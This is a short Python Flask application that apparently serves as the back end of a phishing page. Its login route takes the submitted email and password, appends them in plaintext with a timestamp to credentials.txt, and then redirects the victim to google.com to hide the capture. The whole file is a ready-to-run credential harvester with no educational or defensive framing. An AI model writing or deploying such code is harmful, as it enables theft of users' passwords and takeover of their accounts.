from flask import Flask, render_template, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    with open("credentials.txt", "a") as f:
        f.write(f"Email/Username: {email}, Password: {password}, Time: {datetime.now()}\n")

    return redirect('https://www.google.com')

if __name__ == '__main__':
    app.run(debug=True)
